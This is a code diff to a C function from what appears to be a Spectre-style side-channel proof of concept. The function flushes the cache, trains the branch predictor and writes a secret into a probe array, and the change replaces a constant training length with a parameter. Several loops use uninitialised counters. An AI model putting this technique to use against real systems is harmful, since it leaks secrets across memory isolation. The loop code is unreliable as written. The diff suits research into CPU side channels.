@@ -66,15 +66,15 @@ bool is_cached(uint8_t *address, size_t threshold)
 uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len,
                         uint64_t secret, uint8_t channel[],
                         uint8_t bits_count, uint64_t stride),
-         uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride)
+         uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length)
 {
     // creating transfer array
     uint8_t side_channel[(bits_count + 1) * stride];
     uint32_t out_index = 0;
     bool training;
 
-    uint32_t train_data[TRAIN_DATA_LENGTH * stride];
-    for (uint32_t i; i < TRAIN_DATA_LENGTH * stride; i++)
+    uint32_t train_data[train_data_length * stride];
+    for (uint32_t i; i < train_data_length * stride; i++)
     {
         train_data[i] = i+1;
     }
@@ -84,16 +84,16 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
 
     memset(side_channel,5, (bits_count + 1) * stride);
 
-    for (uint32_t i; i < TRAIN_DATA_LENGTH * stride; i++)
+    for (uint32_t i; i < train_data_length * stride; i++)
         clflush(&train_data[i]);
 
     lfence();
     mfence();
 
     // training the predictor
-    for (uint32_t i = 0; i < (TRAIN_DATA_LENGTH * stride) - 1; i += stride)
+    for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
     {
-        training = leak_data(i, train_data, TRAIN_DATA_LENGTH * stride, in, side_channel, bits_count, stride);
+        training = leak_data(i, train_data, train_data_length * stride, in, side_channel, bits_count, stride);
         //printf("Training: %d\n", training);
     }
 
@@ -107,7 +107,7 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     mfence();
     
     // writing secret into the side channel array
-    training = leak_data((TRAIN_DATA_LENGTH * stride) - 1, train_data, TRAIN_DATA_LENGTH * stride, in, side_channel, bits_count, stride);
+    training = leak_data((train_data_length * stride) - 1, train_data, train_data_length * stride, in, side_channel, bits_count, stride);
     printf("Training: %d\n", training);
 
     char binaryResult[bits_count + 1];
